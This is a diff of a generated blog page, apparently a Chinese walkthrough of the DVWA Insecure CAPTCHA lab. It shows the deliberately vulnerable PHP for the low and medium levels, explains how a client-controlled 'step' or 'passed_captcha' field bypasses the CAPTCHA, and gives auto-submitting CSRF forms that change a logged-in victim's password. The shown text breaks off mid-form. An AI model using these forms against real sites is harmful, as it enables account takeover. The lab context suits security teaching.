@@ -87,13 +87,13 @@
                 
                 <span>
                     <b class="iconfont icon-text2"></b> <i>Words count</i>
-                    37k
+                    19k
                 </span>
                 
                 
                 <span>
                     <b class="iconfont icon-timer__s"></b> <i>Reading time</i>
-                    34 mins.
+                    17 mins.
                 </span>
                 
                 
@@ -127,13 +127,88 @@
 <div class="article">
     <div class='main'>
         <div class="content markdown animated fadeIn">
-            <h2 id="源码位置"><a href="#源码位置" class="headerlink" title="源码位置"></a>源码位置</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">DVWA\vulnerabilities\captcha\source\</span><br></pre></td></tr></table></figure>
-<h2 id="页面功能"><a href="#页面功能" class="headerlink" title="页面功能"></a>页面功能</h2><p>和CSRF一样的功能：更改密码，但是却要通过验证码（但是由于验证码是由谷歌提供，没有翻墙也就没有验证码）</p>
+            <h2 id="源码位置"><a href="#源码位置" class="headerlink" title="源码位置"></a>源码位置</h2><pre><code>DVWA\vulnerabilities\captcha\source\
+</code></pre><h2 id="页面功能"><a href="#页面功能" class="headerlink" title="页面功能"></a>页面功能</h2><p>和CSRF一样的功能：更改密码，但是却要通过验证码（但是由于验证码是由谷歌提供，没有翻墙也就没有验证码）</p>
 <p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/DVWA/6-1.png" alt="6-1"></p>
 <h2 id="解决-reCAPTCHA-API-key-missing-问题"><a href="#解决-reCAPTCHA-API-key-missing-问题" class="headerlink" title="解决 reCAPTCHA API key missing 问题"></a>解决 reCAPTCHA API key missing 问题</h2><p>参考文章：<a href="https://blog.csdn.net/RBPicsdn/article/details/80059132" target="_blank" rel="noopener">https://blog.csdn.net/RBPicsdn/article/details/80059132</a></p>
 <p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/DVWA/6-2.png" alt="6-2"></p>
 <h2 id="Security-Level-—-Low"><a href="#Security-Level-—-Low" class="headerlink" title="Security Level — Low"></a>Security Level — Low</h2><p>核心代码</p>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>( <span class="keyword">isset</span>( $_POST[ <span class="string">'Change'</span> ] ) &amp;&amp; ( $_POST[ <span class="string">'step'</span> ] == <span class="string">'1'</span> ) ) &#123;</span><br><span class="line">	<span class="comment">// Hide the CAPTCHA form</span></span><br><span class="line">	$hide_form = <span class="keyword">true</span>;</span><br><span class="line"></span><br><span class="line">	<span class="comment">// Get input</span></span><br><span class="line">	$pass_new  = $_POST[ <span class="string">'password_new'</span> ];</span><br><span class="line">	$pass_conf = $_POST[ <span class="string">'password_conf'</span> ];</span><br><span class="line"></span><br><span class="line">	<span class="comment">// Check CAPTCHA from 3rd party</span></span><br><span class="line">	$resp = recaptcha_check_answer(</span><br><span class="line">		$_DVWA[ <span class="string">'recaptcha_private_key'</span>],</span><br><span class="line">		$_POST[<span class="string">'g-recaptcha-response'</span>]</span><br><span class="line">	);</span><br><span class="line"></span><br><span class="line">	<span class="comment">// Did the CAPTCHA fail?</span></span><br><span class="line">	<span class="keyword">if</span>( !$resp ) &#123;</span><br><span class="line">		<span class="comment">// What happens when the CAPTCHA was entered incorrectly</span></span><br><span class="line">		$html     .= <span class="string">"&lt;pre&gt;&lt;br /&gt;The CAPTCHA was incorrect. Please try again.&lt;/pre&gt;"</span>;</span><br><span class="line">		$hide_form = <span class="keyword">false</span>;</span><br><span class="line">		<span class="keyword">return</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">else</span> &#123;</span><br><span class="line">		<span class="comment">// CAPTCHA was correct. Do both new passwords match?</span></span><br><span class="line">		<span class="keyword">if</span>( $pass_new == $pass_conf ) &#123;</span><br><span class="line">			<span class="comment">// Show next stage for the user</span></span><br><span class="line">			$html .= <span class="string">"</span></span><br><span class="line"><span class="string">				&lt;pre&gt;&lt;br /&gt;You passed the CAPTCHA! Click the button to confirm your changes.&lt;br /&gt;&lt;/pre&gt;</span></span><br><span class="line"><span class="string">				&lt;form action=\"#\" method=\"POST\"&gt;</span></span><br><span class="line"><span class="string">					&lt;input type=\"hidden\" name=\"step\" value=\"2\" /&gt;</span></span><br><span class="line"><span class="string">					&lt;input type=\"hidden\" name=\"password_new\" value=\"&#123;$pass_new&#125;\" /&gt;</span></span><br><span class="line"><span class="string">					&lt;input type=\"hidden\" name=\"password_conf\" value=\"&#123;$pass_conf&#125;\" /&gt;</span></span><br><span class="line"><span class="string">					&lt;input type=\"submit\" name=\"Change\" value=\"Change\" /&gt;</span></span><br><span class="line"><span class="string">				&lt;/form&gt;"</span>;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">else</span> &#123;</span><br><span class="line">			<span class="comment">// Both new passwords do not match.</span></span><br><span class="line">			$html     .= <span class="string">"&lt;pre&gt;Both passwords must match.&lt;/pre&gt;"</span>;</span><br><span class="line">			$hide_form = <span class="keyword">false</span>;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>( <span class="keyword">isset</span>( $_POST[ <span class="string">'Change'</span> ] ) &amp;&amp; ( $_POST[ <span class="string">'step'</span> ] == <span class="string">'2'</span> ) ) &#123;</span><br><span class="line">	<span class="comment">// Hide the CAPTCHA form</span></span><br><span class="line">	$hide_form = <span class="keyword">true</span>;</span><br><span class="line"></span><br><span class="line">	<span class="comment">// Get input</span></span><br><span class="line">	$pass_new  = $_POST[ <span class="string">'password_new'</span> ];</span><br><span class="line">	$pass_conf = $_POST[ <span class="string">'password_conf'</span> ];</span><br><span class="line"></span><br><span class="line">	<span class="comment">// Check to see if both password match</span></span><br><span class="line">	<span class="keyword">if</span>( $pass_new == $pass_conf ) &#123;</span><br><span class="line">		<span class="comment">// They do!</span></span><br><span class="line">		$pass_new = ((<span class="keyword">isset</span>($GLOBALS[<span class="string">"___mysqli_ston"</span>]) &amp;&amp; is_object($GLOBALS[<span class="string">"___mysqli_ston"</span>])) ? mysqli_real_escape_string($GLOBALS[<span class="string">"___mysqli_ston"</span>],  $pass_new ) : ((trigger_error(<span class="string">"[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work."</span>, E_USER_ERROR)) ? <span class="string">""</span> : <span class="string">""</span>));</span><br><span class="line">		$pass_new = md5( $pass_new );</span><br><span class="line"></span><br><span class="line">		<span class="comment">// Update database</span></span><br><span class="line">		$insert = <span class="string">"UPDATE `users` SET password = '$pass_new' WHERE user = '"</span> . dvwaCurrentUser() . <span class="string">"';"</span>;</span><br><span class="line">		$result = mysqli_query($GLOBALS[<span class="string">"___mysqli_ston"</span>],  $insert ) <span class="keyword">or</span> <span class="keyword">die</span>( <span class="string">'&lt;pre&gt;'</span> . ((is_object($GLOBALS[<span class="string">"___mysqli_ston"</span>])) ? mysqli_error($GLOBALS[<span class="string">"___mysqli_ston"</span>]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : <span class="keyword">false</span>)) . <span class="string">'&lt;/pre&gt;'</span> );</span><br><span class="line"></span><br><span class="line">		<span class="comment">// Feedback for the end user</span></span><br><span class="line">		$html .= <span class="string">"&lt;pre&gt;Password Changed.&lt;/pre&gt;"</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">else</span> &#123;</span><br><span class="line">		<span class="comment">// Issue with the passwords matching</span></span><br><span class="line">		$html .= <span class="string">"&lt;pre&gt;Passwords did not match.&lt;/pre&gt;"</span>;</span><br><span class="line">		$hide_form = <span class="keyword">false</span>;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	((is_null($___mysqli_res = mysqli_close($GLOBALS[<span class="string">"___mysqli_ston"</span>]))) ? <span class="keyword">false</span> : $___mysqli_res);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<pre><code class="php">&lt;?php
+
+if( isset( $_POST[ &#39;Change&#39; ] ) &amp;&amp; ( $_POST[ &#39;step&#39; ] == &#39;1&#39; ) ) {
+    // Hide the CAPTCHA form
+    $hide_form = true;
+
+    // Get input
+    $pass_new  = $_POST[ &#39;password_new&#39; ];
+    $pass_conf = $_POST[ &#39;password_conf&#39; ];
+
+    // Check CAPTCHA from 3rd party
+    $resp = recaptcha_check_answer(
+        $_DVWA[ &#39;recaptcha_private_key&#39;],
+        $_POST[&#39;g-recaptcha-response&#39;]
+    );
+
+    // Did the CAPTCHA fail?
+    if( !$resp ) {
+        // What happens when the CAPTCHA was entered incorrectly
+        $html     .= &quot;&lt;pre&gt;&lt;br /&gt;The CAPTCHA was incorrect. Please try again.&lt;/pre&gt;&quot;;
+        $hide_form = false;
+        return;
+    }
+    else {
+        // CAPTCHA was correct. Do both new passwords match?
+        if( $pass_new == $pass_conf ) {
+            // Show next stage for the user
+            $html .= &quot;
+                &lt;pre&gt;&lt;br /&gt;You passed the CAPTCHA! Click the button to confirm your changes.&lt;br /&gt;&lt;/pre&gt;
+                &lt;form action=\&quot;#\&quot; method=\&quot;POST\&quot;&gt;
+                    &lt;input type=\&quot;hidden\&quot; name=\&quot;step\&quot; value=\&quot;2\&quot; /&gt;
+                    &lt;input type=\&quot;hidden\&quot; name=\&quot;password_new\&quot; value=\&quot;{$pass_new}\&quot; /&gt;
+                    &lt;input type=\&quot;hidden\&quot; name=\&quot;password_conf\&quot; value=\&quot;{$pass_conf}\&quot; /&gt;
+                    &lt;input type=\&quot;submit\&quot; name=\&quot;Change\&quot; value=\&quot;Change\&quot; /&gt;
+                &lt;/form&gt;&quot;;
+        }
+        else {
+            // Both new passwords do not match.
+            $html     .= &quot;&lt;pre&gt;Both passwords must match.&lt;/pre&gt;&quot;;
+            $hide_form = false;
+        }
+    }
+}
+
+if( isset( $_POST[ &#39;Change&#39; ] ) &amp;&amp; ( $_POST[ &#39;step&#39; ] == &#39;2&#39; ) ) {
+    // Hide the CAPTCHA form
+    $hide_form = true;
+
+    // Get input
+    $pass_new  = $_POST[ &#39;password_new&#39; ];
+    $pass_conf = $_POST[ &#39;password_conf&#39; ];
+
+    // Check to see if both password match
+    if( $pass_new == $pass_conf ) {
+        // They do!
+        $pass_new = ((isset($GLOBALS[&quot;___mysqli_ston&quot;]) &amp;&amp; is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_real_escape_string($GLOBALS[&quot;___mysqli_ston&quot;],  $pass_new ) : ((trigger_error(&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;, E_USER_ERROR)) ? &quot;&quot; : &quot;&quot;));
+        $pass_new = md5( $pass_new );
+
+        // Update database
+        $insert = &quot;UPDATE `users` SET password = &#39;$pass_new&#39; WHERE user = &#39;&quot; . dvwaCurrentUser() . &quot;&#39;;&quot;;
+        $result = mysqli_query($GLOBALS[&quot;___mysqli_ston&quot;],  $insert ) or die( &#39;&lt;pre&gt;&#39; . ((is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_error($GLOBALS[&quot;___mysqli_ston&quot;]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . &#39;&lt;/pre&gt;&#39; );
+
+        // Feedback for the end user
+        $html .= &quot;&lt;pre&gt;Password Changed.&lt;/pre&gt;&quot;;
+    }
+    else {
+        // Issue with the passwords matching
+        $html .= &quot;&lt;pre&gt;Passwords did not match.&lt;/pre&gt;&quot;;
+        $hide_form = false;
+    }
+
+    ((is_null($___mysqli_res = mysqli_close($GLOBALS[&quot;___mysqli_ston&quot;]))) ? false : $___mysqli_res);
+}
+
+?&gt;
+</code></pre>
 <p>源代码只是简单地通过<code>setp</code>参数来决定执行哪些步骤：①<code>setp=1</code>时接受用户提交的新密码、新密码确认、验证码，然后对验证码进行验证，验证通过后，如果新密码等于新密码确认，重新构造并提交表单（包含新密码、新密码确认和setp=2）；②<code>setp=2</code>时，直接将密码进行md5加密后修改当前登录用户的密码。很容易看出来这个逻辑漏洞，这个setp参数是通过POST方式提交的并且可控的话，我们可以直接绕过验证码的验证部分，进入修改密码部分</p>
 <p>现在修改密码并抓包看一下请求包的内容</p>
 <p>Ps:因为没有翻墙，所以没能成功显示验证码，发送的请求包中也就没有<code>recaptcha_challenge_field</code>、<code>recaptcha_response_field</code>两个参数</p>
@@ -141,23 +216,278 @@
 <p>将<code>setp=1</code>改为<code>setp=2</code>，然后发送请求后，可以看到提示<code>Password Changed</code></p>
 <p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/DVWA/6-4.png" alt="6-4"></p>
 <p>由于没有防CSRF的机制，所以现在构造攻击页面去攻击，HTML代码如下</p>
-<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span>      </span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span> <span class="attr">onload</span>=<span class="string">"document.getElementById('transfer').submit()"</span>&gt;</span>        </span><br><span class="line"></span><br><span class="line">	<span class="tag">&lt;<span class="name">div</span>&gt;</span>    </span><br><span class="line"></span><br><span class="line">		<span class="tag">&lt;<span class="name">form</span> <span class="attr">method</span>=<span class="string">"POST"</span> <span class="attr">id</span>=<span class="string">"transfer"</span> <span class="attr">action</span>=<span class="string">"http://192.168.0.105/dvwa/vulnerabilities/captcha/"</span>&gt;</span>     </span><br><span class="line"></span><br><span class="line">			<span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"hidden"</span> <span class="attr">name</span>=<span class="string">"password_new"</span> <span class="attr">value</span>=<span class="string">"888"</span>&gt;</span></span><br><span class="line"></span><br><span class="line">			<span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"hidden"</span> <span class="attr">name</span>=<span class="string">"password_conf"</span> <span class="attr">value</span>=<span class="string">"888"</span>&gt;</span>     </span><br><span class="line"></span><br><span class="line">			<span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"hidden"</span> <span class="attr">name</span>=<span class="string">"step"</span> <span class="attr">value</span>=<span class="string">"2"</span>&gt;</span>   </span><br><span class="line"></span><br><span class="line">			<span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"hidden"</span> <span class="attr">name</span>=<span class="string">"Change"</span> <span class="attr">value</span>=<span class="string">"Change"</span>&gt;</span>        </span><br><span class="line"></span><br><span class="line">		<span class="tag">&lt;/<span class="name">form</span>&gt;</span>        </span><br><span class="line"></span><br><span class="line">	<span class="tag">&lt;/<span class="name">div</span>&gt;</span>        </span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<pre><code class="html">&lt;html&gt;      
+
+&lt;body onload=&quot;document.getElementById(&#39;transfer&#39;).submit()&quot;&gt;        
+
+    &lt;div&gt;    
+
+        &lt;form method=&quot;POST&quot; id=&quot;transfer&quot; action=&quot;http://192.168.0.105/dvwa/vulnerabilities/captcha/&quot;&gt;     
+
+            &lt;input type=&quot;hidden&quot; name=&quot;password_new&quot; value=&quot;888&quot;&gt;
+
+            &lt;input type=&quot;hidden&quot; name=&quot;password_conf&quot; value=&quot;888&quot;&gt;     
+
+            &lt;input type=&quot;hidden&quot; name=&quot;step&quot; value=&quot;2&quot;&gt;   
+
+            &lt;input type=&quot;hidden&quot; name=&quot;Change&quot; value=&quot;Change&quot;&gt;        
+
+        &lt;/form&gt;        
+
+    &lt;/div&gt;        
+
+&lt;/body&gt;
+
+&lt;/html&gt;
+</code></pre>
 <p>当受害者访问这个页面之后，代码就会自动向服务器提交表单利用刚才分析的漏洞去修改密码。但是有一点不好就是服务器会302重定向，返回修改密码成功的页面，受害者就会马上意识到</p>
 <p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/DVWA/6-5.png" alt="6-5"></p>
 <h2 id="Security-Level-—-Medium"><a href="#Security-Level-—-Medium" class="headerlink" title="Security Level — Medium"></a>Security Level — Medium</h2><p>核心代码</p>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>( <span class="keyword">isset</span>( $_POST[ <span class="string">'Change'</span> ] ) &amp;&amp; ( $_POST[ <span class="string">'step'</span> ] == <span class="string">'1'</span> ) ) &#123;</span><br><span class="line">	<span class="comment">// Hide the CAPTCHA form</span></span><br><span class="line">	$hide_form = <span class="keyword">true</span>;</span><br><span class="line"></span><br><span class="line">	<span class="comment">// Get input</span></span><br><span class="line">	$pass_new  = $_POST[ <span class="string">'password_new'</span> ];</span><br><span class="line">	$pass_conf = $_POST[ <span class="string">'password_conf'</span> ];</span><br><span class="line"></span><br><span class="line">	<span class="comment">// Check CAPTCHA from 3rd party</span></span><br><span class="line">	$resp = recaptcha_check_answer(</span><br><span class="line">		$_DVWA[ <span class="string">'recaptcha_private_key'</span> ],</span><br><span class="line">		$_POST[<span class="string">'g-recaptcha-response'</span>]</span><br><span class="line">	);</span><br><span class="line"></span><br><span class="line">	<span class="comment">// Did the CAPTCHA fail?</span></span><br><span class="line">	<span class="keyword">if</span>( !$resp ) &#123;</span><br><span class="line">		<span class="comment">// What happens when the CAPTCHA was entered incorrectly</span></span><br><span class="line">		$html     .= <span class="string">"&lt;pre&gt;&lt;br /&gt;The CAPTCHA was incorrect. Please try again.&lt;/pre&gt;"</span>;</span><br><span class="line">		$hide_form = <span class="keyword">false</span>;</span><br><span class="line">		<span class="keyword">return</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">else</span> &#123;</span><br><span class="line">		<span class="comment">// CAPTCHA was correct. Do both new passwords match?</span></span><br><span class="line">		<span class="keyword">if</span>( $pass_new == $pass_conf ) &#123;</span><br><span class="line">			<span class="comment">// Show next stage for the user</span></span><br><span class="line">			$html .= <span class="string">"</span></span><br><span class="line"><span class="string">				&lt;pre&gt;&lt;br /&gt;You passed the CAPTCHA! Click the button to confirm your changes.&lt;br /&gt;&lt;/pre&gt;</span></span><br><span class="line"><span class="string">				&lt;form action=\"#\" method=\"POST\"&gt;</span></span><br><span class="line"><span class="string">					&lt;input type=\"hidden\" name=\"step\" value=\"2\" /&gt;</span></span><br><span class="line"><span class="string">					&lt;input type=\"hidden\" name=\"password_new\" value=\"&#123;$pass_new&#125;\" /&gt;</span></span><br><span class="line"><span class="string">					&lt;input type=\"hidden\" name=\"password_conf\" value=\"&#123;$pass_conf&#125;\" /&gt;</span></span><br><span class="line"><span class="string">					&lt;input type=\"hidden\" name=\"passed_captcha\" value=\"true\" /&gt;</span></span><br><span class="line"><span class="string">					&lt;input type=\"submit\" name=\"Change\" value=\"Change\" /&gt;</span></span><br><span class="line"><span class="string">				&lt;/form&gt;"</span>;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">else</span> &#123;</span><br><span class="line">			<span class="comment">// Both new passwords do not match.</span></span><br><span class="line">			$html     .= <span class="string">"&lt;pre&gt;Both passwords must match.&lt;/pre&gt;"</span>;</span><br><span class="line">			$hide_form = <span class="keyword">false</span>;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>( <span class="keyword">isset</span>( $_POST[ <span class="string">'Change'</span> ] ) &amp;&amp; ( $_POST[ <span class="string">'step'</span> ] == <span class="string">'2'</span> ) ) &#123;</span><br><span class="line">	<span class="comment">// Hide the CAPTCHA form</span></span><br><span class="line">	$hide_form = <span class="keyword">true</span>;</span><br><span class="line"></span><br><span class="line">	<span class="comment">// Get input</span></span><br><span class="line">	$pass_new  = $_POST[ <span class="string">'password_new'</span> ];</span><br><span class="line">	$pass_conf = $_POST[ <span class="string">'password_conf'</span> ];</span><br><span class="line"></span><br><span class="line">	<span class="comment">// Check to see if they did stage 1</span></span><br><span class="line">	<span class="keyword">if</span>( !$_POST[ <span class="string">'passed_captcha'</span> ] ) &#123;</span><br><span class="line">		$html     .= <span class="string">"&lt;pre&gt;&lt;br /&gt;You have not passed the CAPTCHA.&lt;/pre&gt;"</span>;</span><br><span class="line">		$hide_form = <span class="keyword">false</span>;</span><br><span class="line">		<span class="keyword">return</span>;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="comment">// Check to see if both password match</span></span><br><span class="line">	<span class="keyword">if</span>( $pass_new == $pass_conf ) &#123;</span><br><span class="line">		<span class="comment">// They do!</span></span><br><span class="line">		$pass_new = ((<span class="keyword">isset</span>($GLOBALS[<span class="string">"___mysqli_ston"</span>]) &amp;&amp; is_object($GLOBALS[<span class="string">"___mysqli_ston"</span>])) ? mysqli_real_escape_string($GLOBALS[<span class="string">"___mysqli_ston"</span>],  $pass_new ) : ((trigger_error(<span class="string">"[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work."</span>, E_USER_ERROR)) ? <span class="string">""</span> : <span class="string">""</span>));</span><br><span class="line">		$pass_new = md5( $pass_new );</span><br><span class="line"></span><br><span class="line">		<span class="comment">// Update database</span></span><br><span class="line">		$insert = <span class="string">"UPDATE `users` SET password = '$pass_new' WHERE user = '"</span> . dvwaCurrentUser() . <span class="string">"';"</span>;</span><br><span class="line">		$result = mysqli_query($GLOBALS[<span class="string">"___mysqli_ston"</span>],  $insert ) <span class="keyword">or</span> <span class="keyword">die</span>( <span class="string">'&lt;pre&gt;'</span> . ((is_object($GLOBALS[<span class="string">"___mysqli_ston"</span>])) ? mysqli_error($GLOBALS[<span class="string">"___mysqli_ston"</span>]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : <span class="keyword">false</span>)) . <span class="string">'&lt;/pre&gt;'</span> );</span><br><span class="line"></span><br><span class="line">		<span class="comment">// Feedback for the end user</span></span><br><span class="line">		$html .= <span class="string">"&lt;pre&gt;Password Changed.&lt;/pre&gt;"</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">else</span> &#123;</span><br><span class="line">		<span class="comment">// Issue with the passwords matching</span></span><br><span class="line">		$html .= <span class="string">"&lt;pre&gt;Passwords did not match.&lt;/pre&gt;"</span>;</span><br><span class="line">		$hide_form = <span class="keyword">false</span>;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	((is_null($___mysqli_res = mysqli_close($GLOBALS[<span class="string">"___mysqli_ston"</span>]))) ? <span class="keyword">false</span> : $___mysqli_res);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<pre><code class="php">&lt;?php
+
+if( isset( $_POST[ &#39;Change&#39; ] ) &amp;&amp; ( $_POST[ &#39;step&#39; ] == &#39;1&#39; ) ) {
+    // Hide the CAPTCHA form
+    $hide_form = true;
+
+    // Get input
+    $pass_new  = $_POST[ &#39;password_new&#39; ];
+    $pass_conf = $_POST[ &#39;password_conf&#39; ];
+
+    // Check CAPTCHA from 3rd party
+    $resp = recaptcha_check_answer(
+        $_DVWA[ &#39;recaptcha_private_key&#39; ],
+        $_POST[&#39;g-recaptcha-response&#39;]
+    );
+
+    // Did the CAPTCHA fail?
+    if( !$resp ) {
+        // What happens when the CAPTCHA was entered incorrectly
+        $html     .= &quot;&lt;pre&gt;&lt;br /&gt;The CAPTCHA was incorrect. Please try again.&lt;/pre&gt;&quot;;
+        $hide_form = false;
+        return;
+    }
+    else {
+        // CAPTCHA was correct. Do both new passwords match?
+        if( $pass_new == $pass_conf ) {
+            // Show next stage for the user
+            $html .= &quot;
+                &lt;pre&gt;&lt;br /&gt;You passed the CAPTCHA! Click the button to confirm your changes.&lt;br /&gt;&lt;/pre&gt;
+                &lt;form action=\&quot;#\&quot; method=\&quot;POST\&quot;&gt;
+                    &lt;input type=\&quot;hidden\&quot; name=\&quot;step\&quot; value=\&quot;2\&quot; /&gt;
+                    &lt;input type=\&quot;hidden\&quot; name=\&quot;password_new\&quot; value=\&quot;{$pass_new}\&quot; /&gt;
+                    &lt;input type=\&quot;hidden\&quot; name=\&quot;password_conf\&quot; value=\&quot;{$pass_conf}\&quot; /&gt;
+                    &lt;input type=\&quot;hidden\&quot; name=\&quot;passed_captcha\&quot; value=\&quot;true\&quot; /&gt;
+                    &lt;input type=\&quot;submit\&quot; name=\&quot;Change\&quot; value=\&quot;Change\&quot; /&gt;
+                &lt;/form&gt;&quot;;
+        }
+        else {
+            // Both new passwords do not match.
+            $html     .= &quot;&lt;pre&gt;Both passwords must match.&lt;/pre&gt;&quot;;
+            $hide_form = false;
+        }
+    }
+}
+
+if( isset( $_POST[ &#39;Change&#39; ] ) &amp;&amp; ( $_POST[ &#39;step&#39; ] == &#39;2&#39; ) ) {
+    // Hide the CAPTCHA form
+    $hide_form = true;
+
+    // Get input
+    $pass_new  = $_POST[ &#39;password_new&#39; ];
+    $pass_conf = $_POST[ &#39;password_conf&#39; ];
+
+    // Check to see if they did stage 1
+    if( !$_POST[ &#39;passed_captcha&#39; ] ) {
+        $html     .= &quot;&lt;pre&gt;&lt;br /&gt;You have not passed the CAPTCHA.&lt;/pre&gt;&quot;;
+        $hide_form = false;
+        return;
+    }
+
+    // Check to see if both password match
+    if( $pass_new == $pass_conf ) {
+        // They do!
+        $pass_new = ((isset($GLOBALS[&quot;___mysqli_ston&quot;]) &amp;&amp; is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_real_escape_string($GLOBALS[&quot;___mysqli_ston&quot;],  $pass_new ) : ((trigger_error(&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;, E_USER_ERROR)) ? &quot;&quot; : &quot;&quot;));
+        $pass_new = md5( $pass_new );
+
+        // Update database
+        $insert = &quot;UPDATE `users` SET password = &#39;$pass_new&#39; WHERE user = &#39;&quot; . dvwaCurrentUser() . &quot;&#39;;&quot;;
+        $result = mysqli_query($GLOBALS[&quot;___mysqli_ston&quot;],  $insert ) or die( &#39;&lt;pre&gt;&#39; . ((is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_error($GLOBALS[&quot;___mysqli_ston&quot;]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . &#39;&lt;/pre&gt;&#39; );
+
+        // Feedback for the end user
+        $html .= &quot;&lt;pre&gt;Password Changed.&lt;/pre&gt;&quot;;
+    }
+    else {
+        // Issue with the passwords matching
+        $html .= &quot;&lt;pre&gt;Passwords did not match.&lt;/pre&gt;&quot;;
+        $hide_form = false;
+    }
+
+    ((is_null($___mysqli_res = mysqli_close($GLOBALS[&quot;___mysqli_ston&quot;]))) ? false : $___mysqli_res);
+}
+
+?&gt;
+</code></pre>
 <p>本难度只是在<code>setp=1</code>提交的表单中多添加了<code>passed_captcha</code>参数，当<code>setp=2</code>没有检测到这个参数时就会报错。那解决办法也很简单，只需要在我们做的攻击表单中多添加这个参数，值为true就可以了</p>
-<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span>      </span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span> <span class="attr">onload</span>=<span class="string">"document.getElementById('transfer').submit()"</span>&gt;</span>        </span><br><span class="line"></span><br><span class="line">	<span class="tag">&lt;<span class="name">div</span>&gt;</span>    </span><br><span class="line"></span><br><span class="line">		<span class="tag">&lt;<span class="name">form</span> <span class="attr">method</span>=<span class="string">"POST"</span> <span class="attr">id</span>=<span class="string">"transfer"</span> <span class="attr">action</span>=<span class="string">"http://192.168.0.105/dvwa/vulnerabilities/captcha/"</span>&gt;</span>     </span><br><span class="line"></span><br><span class="line">			<span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"hidden"</span> <span class="attr">name</span>=<span class="string">"password_new"</span> <span class="attr">value</span>=<span class="string">"777"</span>&gt;</span></span><br><span class="line"></span><br><span class="line">			<span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"hidden"</span> <span class="attr">name</span>=<span class="string">"password_conf"</span> <span class="attr">value</span>=<span class="string">"777"</span>&gt;</span></span><br><span class="line">            </span><br><span class="line">             <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"hidden"</span> <span class="attr">name</span>=<span class="string">"passed_captcha"</span> <span class="attr">value</span>=<span class="string">"true"</span>&gt;</span></span><br><span class="line"></span><br><span class="line">			<span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"hidden"</span> <span class="attr">name</span>=<span class="string">"step"</span> <span class="attr">value</span>=<span class="string">"2"</span>&gt;</span>   </span><br><span class="line"></span><br><span class="line">			<span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"hidden"</span> <span class="attr">name</span>=<span class="string">"Change"</span> <span class="attr">value</span>=<span class="string">"Change"</span>&gt;</span>        </span><br><span class="line"></span><br><span class="line">		<span class="tag">&lt;/<span class="name">form</span>&gt;</span>        </span><br><span class="line"></span><br><span class="line">	<span class="tag">&lt;/<span class="name">div</span>&gt;</span>        </span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<pre><code class="html">&lt;html&gt;      
+
+&lt;body onload=&quot;document.getElementById(&#39;transfer&#39;).submit()&quot;&gt;        
+
+    &lt;div&gt;    
+
+        &lt;form method=&quot;POST&quot; id=&quot;transfer&quot; action=&quot;http://192.168.0.105/dvwa/vulnerabilities/captcha/&quot;&gt;     
+
+            &lt;input type=&quot;hidden&quot; name=&quot;password_new&quot; value=&quot;777&quot;&gt;
+
